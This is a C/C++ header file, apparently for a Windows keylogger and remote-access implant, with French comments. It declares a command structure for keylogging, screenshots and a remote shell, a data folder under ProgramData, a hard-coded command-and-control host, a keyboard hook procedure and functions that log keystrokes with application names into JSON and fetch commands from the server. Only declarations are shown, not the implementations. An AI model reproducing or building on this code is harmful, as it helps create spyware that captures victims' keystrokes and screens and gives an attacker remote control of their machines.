#ifndef PA5A_HPP
#define PA5A_HPP

#include <Windows.h>
#include <WinInet.h>
#include <Psapi.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "cJSON/cJSON.hpp"
#include "utils.hpp"

#pragma comment(lib, "wininet")
EXTERN_C_START

/*enum EnumCommands
{
	KEYLOGS,
	SCREENSHOT,
	SHELL
} EnumCommands;*/


struct CommandsToExecute
{
	BYTE keylogs;
	BYTE screenshot;
	BYTE shell;
};


//Pour afficher les informations de debogage
#define DEBUG

#define DATA_FOLDER L"C:\\ProgramData\\PA5A"
#define SERVER_URL_A "pa5a.cyberfilou.site"

/********************************************************************************************************************************************************/
//main.cpp
INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, INT nCmdShow);
LRESULT CALLBACK WindowProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
/********************************************************************************************************************************************************/
//Keylogger.cpp
LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam);
VOID WriteLogs(PWCHAR logsUnicode, PWCHAR appNameUnicode, PWCHAR pathUnicode);
cJSON* CreateJsonObjectLogs(PCHAR logs, PCHAR app, PCHAR path);
VOID WriteJsonObjectLogs(cJSON* newJsonObject);
/********************************************************************************************************************************************************/

int GetUuid(char* uuid);
BOOL GetCommands(struct CommandsToExecute* commandsToExecute);


EXTERN_C_END

#endif // PA5A_HPP
